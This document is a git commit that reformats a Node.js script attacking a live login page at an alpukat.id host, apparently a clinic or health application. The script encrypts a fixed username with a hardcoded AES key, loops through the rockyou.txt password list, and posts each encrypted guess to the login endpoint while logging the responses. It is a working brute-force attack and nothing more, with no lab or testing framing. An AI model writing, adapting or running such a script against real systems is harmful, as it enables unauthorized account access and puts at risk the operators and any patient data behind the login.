f1ff9af4b5bbf048d8d7e9c5697be7c0b2ba0578
Abda Rafi <abda_rafi@yahoo.com>
2022-10-09 10:12:40 +0000

    cleanup

--- script.js
+++ script.js
@@ -1,28 +1,34 @@
-var request = require('request');
-var fs = require('fs');
-var CryptoJS = require('crypto-js');
-var CryptoJSAesJson = require('./');
+var request = require("request");
+var fs = require("fs");
+var CryptoJS = require("crypto-js");
+var CryptoJSAesJson = require("./");
 
-let key = 'b072xal1G090'
-username = CryptoJS.AES.encrypt(JSON.stringify('klinik_healthkathonPro'), key, { format: CryptoJSAesJson }).toString();
-var url = 'http://a.f5xcs.alpukat.id/aGVhbHRoa2F0aG9uUHJv-P/login/akses';
+let key = "b072xal1G090";
+username = CryptoJS.AES.encrypt(JSON.stringify("klinik_healthkathonPro"), key, {
+  format: CryptoJSAesJson,
+}).toString();
+var url = "http://a.f5xcs.alpukat.id/aGVhbHRoa2F0aG9uUHJv-P/login/akses";
 
 var data = {
-    "username":username,
-    "password":"",
-    "typeUser":"3",
-    "ci_csrf_token":""
-  };
+  username: username,
+  password: "",
+  typeUser: "3",
+  ci_csrf_token: "",
+};
 
-var array = fs.readFileSync('rockyou.txt').toString().split("\n");
-for(i in array) {
-    console.log("using password", array[i])
-    data["password"] = CryptoJS.AES.encrypt(JSON.stringify(array[i]), key, { format: CryptoJSAesJson }).toString();
-    request.post({url:url, formData: data}, function(err, httpResponse, body) {
-        if (err) {
-          return console.error('gagal:', err);
-        }
-      
-        console.log('berhasil!  respon:', body);
-      });
-}
+var array = fs.readFileSync("rockyou.txt").toString().split("\n");
+array.forEach(function (pass) {
+  data["password"] = CryptoJS.AES.encrypt(JSON.stringify(pass), key, {
+    format: CryptoJSAesJson,
+  }).toString();
+  request.post(
+    { url: url, formData: data },
+    function (err, httpResponse, body) {
+      if (err) {
+        return console.error("gagal:", err);
+      }
+
+      console.log("using password: " + pass + " respon:", body);
+    }
+  );
+});
